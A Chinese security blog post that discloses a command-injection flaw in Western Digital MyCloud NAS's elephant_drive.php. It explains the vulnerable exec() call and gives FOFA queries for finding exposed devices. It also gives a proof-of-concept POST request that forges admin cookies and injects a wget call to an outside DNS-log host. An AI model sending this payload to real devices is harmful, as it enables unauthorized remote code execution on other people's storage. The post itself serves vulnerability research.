---
title: "西部数码 NAS elephant_drive.php 命令执行漏洞"
source: https://mrxn.net/jswz/west-nas-elephant_drive-rce.html
asset_dir: assets/西部数码-nas-elephant_drive.php-命令执行漏洞
---

# 西部数码 NAS elephant\_drive.php 命令执行漏洞

[Mrxn](https://mrxn.net/author/1)* 发表于2025/9/11 13:05
* 545浏览
* [0评论](#comment)
* 15分钟阅读

深入探索

计算机安全

漏洞扫描服务

在线安全工具


(adsbygoogle = window.adsbygoogle || []).push({});

---

# 漏洞简介

Western Digital MyCloud NAS是一款网络附加存储设备，旨在提供集中存储和共享解决方案。它允许用户在家中或办公室通过网络访问文件，支持多种设备的备份和共享。Western Digital MyCloud NAS elephant\_drive.php中存在[命令执行](https://mrxn.net/tag/rce)漏洞，攻击者可通过该漏洞在服务器端任意执行代码，写入后门，获取服务器权限，进而控制整个web服务器。

漏洞扫描服务

# 影响版本

<=2.11.153（老版本，已发布修复补丁）

# fofa语法

> icon\_hash="-1074357885" && header="X-Powered-By: PHP/5.4.16"
>
> body="\_PROJECT\_MODEL\_ID\_YOSEMITE " && body="\_PROJECT\_MODEL\_ID\_LIGHTNING "

# 漏洞分析

深入探索

JSON处理工具

身份验证

恶意软件分析工具

直接看 `elephant_drive.php` 其业务实现逻辑如下

```
<?php
session_start();
$r = new stdClass();
$r->success = false;

include ("../lib/login_checker.php");

/* login_check() return 0: no login, 1: login, admin, 2: login, normal user */
if (login_check() != 1)
{
    echo json_encode($r);
    exit;
}

$action = $_POST['attion'];
$_email = $_POST['e_email'];
$_password = $_POST['e_password'];
......
case "create":
{
    $ret = check_account($toURL, $check_agg);
    if ($ret == ERR_NONE) //The email not used
    {
       $reg_agg['t'] = exec("elephant_drive -p " . $_password); //get hash password
       $ret = create_account($toURL, $reg_agg);
```

深入探索

软件

安全研究报告

网络安全课程

当attion=create时，`$_password` 是直接拼接进**exec**进行执行，期间对参数没有过滤或校验，导致了[命令注入](https://mrxn.net/tag/rce)漏洞。尽管此漏洞需要管理员权限才能触发，但可以结合`login_check`的权限绕过达到 RCE的效果。

# 漏洞复现

> 需要注意source\_dir应为数组形式，否则foreach循环判断会出错

```
POST /web/backups/elephant_drive.php HTTP/1.1
Host: west-nas.mrxn.ent
Cookie: isAdmin=1;username=admin
Content-Type: application/x-www-form-urlencoded

attion=create&e_email=test@testxxxx.com&e_password=;wget elephant.dnslog.pt;
```

[![西部数码 NAS elephant_drive.php 命令执行漏洞](images/img-001-e9103337b84f.webp)](https://image.mrxn.net/ce5703c5b9f54e5b8c16a52c91399c42.webp)

成功在DNSLOG平台收到DNS和HTTP请求

* 标签：
* [#漏洞](https://mrxn.net/tag/%E6%BC%8F%E6%B4%9E)
* [#php](https://mrxn.net/tag/php)
* [#web安全](https://mrxn.net/tag/web%E5%AE%89%E5%85%A8)
* [#代码审计](https://mrxn.net/tag/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1)
* [#rce](https://mrxn.net/tag/rce)

---


// 获取当前脚本所在的父容器
const parentContainer = document.currentScript.parentElement;
let searchContainer = parentContainer.querySelector('article') || parentContainer;
if (searchContainer) {
// 优先在 class 名为 prose 或 markdown 的容器内搜索 img 图片
let images = [];
const containers = searchContainer.querySelectorAll('.prose, .markdown');
containers.forEach(function(container) {
images = images.concat(Array.from(container.querySelectorAll('img')));
});
if (images.length === 0) {
images = searchContainer.querySelectorAll('img');
}
images.forEach(function(img) {
if (img.getAttribute('data-action') === 'zoom') {
const parentLink = img.parentNode;
if (parentLink.tagName === 'A') {
parentLink.setAttribute('data-fancybox', 'gallery');
}
} else {
const link = document.createElement('a');
link.setAttribute('data-fancybox', 'gallery');
link.setAttribute('href', img.getAttribute('src'));
img.parentNode.insertBefore(link, img);
link.appendChild(img);
}
});
// 初始化 Fancybox
Fancybox.bind("[data-fancybox]", {
// 您的自定义选项
});
}

文章目录
×

* [1.漏洞简介](#toc-1-)
* [2.影响版本](#toc-2-)
* [3.fofa语法](#toc-3-)
* [4.漏洞分析](#toc-4-)
* [5.漏洞复现](#toc-5-)



.x\_nav\_toc {
position: fixed;
top: 0;
right: -300px;
width: 280px;
height: 100%;
background-color: white;
box-shadow: -2px 0 15px rgba(0, 0, 0, 0.1);
z-index: 1000;
transition: right 0.3s ease;
display: flex;
flex-direction: column;
overflow: hidden;
padding-top: 10px;
}
.x\_nav\_toc.active {
right: 0;
}
.x\_toc\_header {
display: flex;
justify-content: space-between;
align-items: center;
padding: 15px 20px;
height: 48px;
border-bottom: 1px solid #eee;
}
.x\_toc\_title {
font-size: 18px;
font-weight: bold;
color: #333;
}
.x\_toc\_close {
background: none;
border: none;
font-size: 24px;
cursor: pointer;
color: #777;
transition: color 0.2s;
}
.x\_toc\_close:hover {
color: #333;
}
.x\_toc\_content {
flex: 1;
overflow-y: auto;
padding: 15px 20px;
padding-right: 10px;
}
.x\_anchor-list {
list-style-type: none;
padding: 0;
margin: 0;
}
/\* 减小目录项间距 \*/
.x\_anchor-list li {
margin-bottom: 4px; /\* 间距从8px减小到4px \*/
}
.x\_anchor-list a {
text-decoration: none;
color: #555;
display: block;
padding: 6px 10px; /\* 减少内边距 \*/
transition: all 0.2s;
font-size: 14px;
border-radius: 4px;
line-height: 1.4; /\* 减小行高 \*/
}
.x\_anchor-list a:hover,
.x\_anchor-list a:focus {
background-color: #f8f9fa;
color: #0068d6;
}
.toc-number {
font-weight: 600;
margin-right: 8px;
color: #495057;
display: inline-block;
min-width: 25px;
}
/\* 减小各级标题间距 \*/
.toc-h1 {
font-weight: 600;
font-size: 15px;
margin-top: 10px; /\* 上边距从15px减小到10px \*/
padding-left: 5px !important;
}
.toc-h2 {
font-size: 14px;
padding-left: 15px !important; /\* 缩进从20px减小到15px \*/
}
.toc-h3 {
font-size: 13px;
padding-left: 25px !important; /\* 缩进从30px减小到25px \*/
}
.toc-h4 {
font-size: 12px;
padding-left: 35px !important; /\* 缩进从40px减小到35px \*/
}
/\* 修改后的切换按钮样式 - 使用图标且位置下移 \*/
.x\_toc\_toggle {
position: fixed;
bottom:120px; right: 17px;width:40px;height:40px;background-color:white;
border-radius: 50%;
border: none;
cursor: pointer;
box-shadow: 0 4px 12px rgba(0,0,0,0.15);
z-index: 999;
transition: all 0.3s ease;
display: flex;
align-items: center;
justify-content: center;
padding: 0;
}
.x\_toc\_toggle svg {
width:24px;height:24px;stroke:#3d9bff;
}
.x\_toc\_toggle:hover {
#background-color: #0081f8;
transform: translateY(-3px);
box-shadow: 0 6px 15px rgba(0,0,0,0.2);
}
@media (max-width: 768px) {
.x\_nav\_toc {
width: 280px;
}
.x\_toc\_toggle {
bottom: 100px; /\* 手机端也下移位置 \*/
right: 30px;
width: 40px;
height: 40px;
}
.x\_toc\_toggle svg {
width: 20px;
height: 20px;
}
}

document.addEventListener('DOMContentLoaded', function() {
// 获取所有标题元素
var className = ".line-numbers";
var selectors = [];
for (var i = 1; i <= 6; i++) {
selectors.push(className + ' h' + i);
}
var headings = document.querySelectorAll(selectors.join(', '));
// 获取DOM元素
var tocContainer = document.querySelector('.x\_nav\_toc');
var toggleButton = document.querySelector('.x\_toc\_toggle');
var tocList = document.querySelector('.x\_anchor-list');
var closeButton = document.querySelector('.x\_toc\_close');
var currentHighlight = null;
// 检测是否为移动设备
const isMobile = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i.test(navigator.userAgent);
// 如果没有标题，隐藏所有元素
if (headings.length === 0) {
tocContainer.style.display = 'none';
toggleButton.style.display = 'none';
return;
}
// 初始化层级计数器
var counters = [0, 0, 0, 0, 0, 0]; // h1-h6
var currentLevel = 0;
// 生成带数字编号的目录
headings.forEach(function(heading, index) {
var level = parseInt(heading.tagName[1]);
// 更新计数器
counters[level - 1] += 1; // 增加当前级别计数器
// 重置更低级计数器
for (var i = level; i < 6; i++) {
counters[i] = 0;
}
// 生成编号字符串（如"1.2.3"）
var numberParts = [];
for (var i = 0; i < level; i++) {
if (counters[i] > 0) {
numberParts.push(counters[i]);
}
}
var numberText = numberParts.join('.')+'.';
// 创建唯一ID
var id = 'toc-' + numberText.replace(/\./g, '-');
heading.id = id;
var listItem = document.createElement('li');
var anchor = document.createElement('a');
var numberSpan = document.createElement('span');
numberSpan.className = 'toc-number';
numberSpan.textContent = numberText;
anchor.appendChild(numberSpan);
anchor.innerHTML += heading.textContent;
anchor.href = '#' + id;
anchor.classList.add('toc-h' + level);
listItem.appendChild(anchor);
tocList.appendChild(listItem);
// 添加点击事件（不关闭目录）
anchor.addEventListener('click', function(e) {
e.preventDefault();
// 更新高亮状态
if (currentHighlight) {
currentHighlight.classList.remove('active');
}
this.classList.add('active');
currentHighlight = this;
// 滚动到对应位置
var targetId = this.getAttribute('href').substring(1);
var targetElement = document.getElementById(targetId);
if (targetElement) {
var header = document.querySelector("header");
var headerHeight = header ? header.offsetHeight : 0;
var elementPosition = targetElement.getBoundingClientRect().top + window.pageYOffset;
var offsetPosition = elementPosition - headerHeight - 20;
window.scrollTo({
top: offsetPosition,
behavior: 'smooth'
});
// 滚动到目录项的可视区域
this.scrollIntoView({behavior: 'smooth', block: 'nearest'});
// 点击事件中
if (isMobile) {
closeToc(); // 移动端点击后关闭目录
}
}
});
});
// 切换按钮点击事件
toggleButton.addEventListener('click', function() {
tocContainer.classList.add('active');
});
// 关闭按钮点击事件
closeButton.addEventListener('click', function(e) {
e.stopPropagation();
closeToc();
});
// 滚动时更新高亮状态
window.addEventListener('scroll', function() {
var fromTop = window.scrollY;
var header = document.querySelector("header");
var headerHeight = header ? header.getBoundingClientRect().height : 0; // 更精确的header高度
//console.log(headerHeight);
// 精准计算标题文档位置
var activeSection = null;
headings.forEach(function(heading) {
var section = document.getElementById(heading.id);
if (!section) return;
// 使用getBoundingClientRect获取精确位置
var rect = section.getBoundingClientRect();
var sectionTop = rect.top + fromTop; // 转换为文档顶部绝对位置
var sectionBottom = rect.bottom + fromTop + headerHeight;
// 增加20px激活区域缓冲
if (fromTop + headerHeight + 20 >= sectionTop && fromTop < sectionBottom) {
activeSection = heading;
}
});
// 更新高亮状态（新增精确边界判断）
if (activeSection) {
var tocLink = tocList.querySelector('a[href="#' + activeSection.id + '"]');
if (tocLink && currentHighlight !== tocLink) {
if (currentHighlight) {
currentHighlight.blur();
currentHighlight.classList.remove('active');
}
tocLink.classList.add('active');
tocLink.focus();
currentHighlight = tocLink;
// 平滑滚动到可视区域（改进触发条件）
var tocRect = tocLink.getBoundingClientRect();
var tocContainerRect = tocContainer.getBoundingClientRect();
if (tocRect.bottom > tocContainerRect.bottom || tocRect.top < tocContainerRect.top) {
tocLink.scrollIntoView({behavior: 'auto', block: 'nearest'});
}
}
}
});
// 关闭目录面板
function closeToc() {
tocContainer.classList.remove('active');
}
});

/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
#qrcode-right {
display: none;
}
}

版权所有：[Mrxn's Blog](https://mrxn.net/)  
文章标题：[西部数码 NAS elephant\_drive.php 命令执行漏洞](https://mrxn.net/jswz/west-nas-elephant_drive-rce.html)  
文章链接：<https://mrxn.net/jswz/west-nas-elephant_drive-rce.html>  
本站文章均为原创，未经授权请勿用于任何商业用途。仅供安全研究和学习使用。若因传播、利用本文档信息而产生任何直接或间接的后果或损害，均由使用者自行承担，文章作者不为此承担任何责任。

安全工具开发

![](data:image/png;base64,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)

设备上扫码阅读


var qrcode = new QRCode(document.getElementById("copyright-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-elephant\_drive-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});

  

### 📚 推荐阅读

* [深信服运维安全管理系统 install\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-install_patch-rce.html)
* [深信服运维安全管理系统 del\_patch 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-system-concentration_management-del_patch-rce.html)
* [深信服运维安全管理系统 upload\_file 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-cssp-app-upload_file-rce.html)
* [深信服运维安全管理系统 csspost/update 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-csspost-update-rce.html)
* [深信服运维安全管理系统 save\_SNMP 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-SNMP-save_SNMP-rce.html)
* [深信服运维安全管理系统 getLdap 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-getLdap-rce.html)
* [深信服运维安全管理系统 Jwt 密钥硬编码](https://mrxn.net/jswz/sangfor_osm-login-search_login-token-leak.html)
* [深信服运维安全管理系统 del\_route 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_route-rce.html)
* [深信服运维安全管理系统 del\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-del_net-rce.html)
* [深信服运维安全管理系统 change\_net 远程命令执行漏洞](https://mrxn.net/jswz/sangfor_osm-netConfig-change_net-rce.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 updateLoginName SQL注入漏洞](https://mrxn.net/jswz/bigant-user-updateLoginName-sqli.html)
* [九佳易管理系统 PrivilegedCodeDestroy.asmx SQL注入漏洞](https://mrxn.net/jswz/a8erp-Interface-licx-PrivilegedCodeDestroy-sqli.html)
* [九佳易管理系统 Ajax\_XT.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-Ajax_XT-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 moveDept SQL注入漏洞](https://mrxn.net/jswz/bigant-dept-moveDept-sqli.html)
* [青龙面板最新版v2.20.1 鉴权绕过致RCE漏洞](https://mrxn.net/jswz/qinglong-auth-bypass-rce.html)
* [九佳易管理系统 picHY.ashx SQL 注入漏洞](https://mrxn.net/jswz/a8erp-HuiYuanDangAn-picHY-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 安装程序二次注入致远程代码执行漏洞](https://mrxn.net/jswz/bigant-install-config-rce.html)
* [东胜物流软件 MsChDuiController 多个SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsChDuiController-sqli.html)
* [大蚂蚁 (BigAnt) 即时通讯系统 PublicController 任意文件读取漏洞](https://mrxn.net/jswz/bigant-Public-download.html)
* [东胜物流软件 MsAnnounceController SQL注入漏洞](https://mrxn.net/jswz/dongsheng-MsAnnounce-GetData-sqli.html)

  

/\* 底部展示样式 \*/
.qrcode-bottom-box {
margin: 40px auto;
text-align: center;
}
.qrcode-title {
font-size: 16px;
color: #666;
margin-bottom: 0px;
font-weight: bold;
text-align: center;
}
.qrcode-bottom-box img {
display: inline-block;
padding: 10px;
background: #fff;
border-radius: 8px;
margin: 10px auto;
}
/\* 悬浮展示样式 \*/
.qrcode-float {
position: fixed;
z-index: 9999;
background: rgba(255,255,255,0.98);
padding: 20px;
border-radius: 12px;
}
.qrcode-float:hover {
transform: scale(1.05);
}
/\* 移动端适配 \*/
@media (max-width: 1440px) {
.qrcode-float {
right: 2%;
transform: none;
}
}
/\* 超小屏幕隐藏 \*/
@media (max-width: 768px) {
.qrcode-float {
display: none;
}
}

![](data:image/png;base64,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)

手机扫码阅读


var qrcode = new QRCode(document.getElementById("posts-qrcode"), {
text: encodeURI("https://mrxn.net/jswz/west-nas-elephant\_drive-rce.html"),
width: 100,
height: 100,
colorDark: "#000000",
colorLight: "#ffffff",
correctLevel: QRCode.CorrectLevel.H
});
 